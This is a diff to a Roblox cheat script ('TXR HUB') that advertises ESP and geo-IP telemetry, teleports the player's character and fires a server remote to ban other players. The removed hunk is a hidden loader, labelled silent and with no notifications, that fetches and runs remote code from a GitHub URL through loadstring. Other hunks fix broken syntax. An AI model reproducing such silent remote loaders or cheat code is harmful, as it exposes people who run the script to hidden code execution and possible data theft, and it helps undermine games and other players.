@@ -13,13 +13,6 @@ end
 repeat task.wait() until _TEMP_LP.Character and _TEMP_LP.Character:FindFirstChild("HumanoidRootPart")
 -- =========================================================
 
--- 🔌 SILENT TELEMETRY / INFO SCRIPT LOADER (NO NOTIFICATIONS)
-task.spawn(function()
-    pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/yelelode/Delta/refs/heads/main/EMP"))()
-    end)
-end)
-
 -- =========================================================
 -- 👑 TXR HUB: QUANTUM CORE V18.26 (ONYX TERMINAL EDITION) 👑
 -- * WITH IRON MAN (J.A.R.V.I.S) ESP & GEO-IP TELEMETRY *
@@ -4251,7 +4244,6 @@ UserInputService.InputBegan:Connect(function(input, gameProcessed)
                         end
                     end
 
-rawhrp = hrp
                     hrp.CFrame = CFrame.new(safePos)
                     
                     local isCleared = false
@@ -4268,7 +4260,7 @@ rawhrp = hrp
                                 for _, c in ipairs(f:GetChildren()) do
                                     if string.sub(c.Name, 1, 4) == "Prop" and string.sub(c.Name, 5) ~= lp.Name then
                                         local pt = c:FindFirstChildWhichIsA("BasePart") or c.PrimaryPart
-                                        if pt and (pt.Position - rawhrp.Position).Magnitude < 25 then
+                                        if pt and (pt.Position - hrp.Position).Magnitude < 25 then
                                             local ownerName = string.sub(c.Name, 5)
                                             local p = Players:FindFirstChild(ownerName)
                                             if p and not protectedVictims[p] then 
@@ -4308,7 +4300,7 @@ rawhrp = hrp
                     if houseData.Allow then
                         for attacker, _ in pairs(attackersToBan) do
                             if attacker and attacker.Parent and not protectedVictims[attacker] then
-                                task.spawn(function`()
+                                task.spawn(function()
                                     task.wait(0.5)
                                     pcall(function() houseData.Allow:FireServer(attacker) end)
                                 end)
